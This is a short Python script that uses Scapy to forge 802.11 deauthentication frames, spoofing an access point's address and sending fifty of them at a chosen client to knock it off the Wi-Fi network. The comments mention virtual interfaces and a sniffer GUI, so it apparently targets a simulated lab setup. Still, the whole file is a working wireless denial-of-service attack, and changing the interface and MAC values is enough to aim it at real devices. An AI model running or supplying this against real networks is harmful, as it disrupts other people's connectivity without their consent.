import time
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

# CONFIGURATION - Change these to match your actual virtual interfaces!
MONITOR_INTERFACE = "wlan2"
TARGET_AP_MAC = "02:00:00:00:00:00"
TARGET_CLIENT_MAC = "02:00:00:00:01:00"

print(f"[*] Target AP: {TARGET_AP_MAC}")
print(f"[*] Target Client: {TARGET_CLIENT_MAC}")
print("[*] Compiling 802.11 Deauth frame...")

# Construct the RadioTap header + 802.11 Frame + Deauth Class
# addr1 = Destination, addr2 = Source (AP), addr3 = BSSID (AP)
packet = RadioTap() / Dot11(addr1=TARGET_CLIENT_MAC, addr2=TARGET_AP_MAC, addr3=TARGET_AP_MAC) / Dot11Deauth(reason=7)

print("[*] Sending 50 deauth frames to disrupt connection...")
for i in range(50):
    sendp(packet, iface=MONITOR_INTERFACE, count=1, verbose=False)
    time.sleep(0.1)

print("[+] Blast complete. Check your Sniffer GUI and client terminal!")
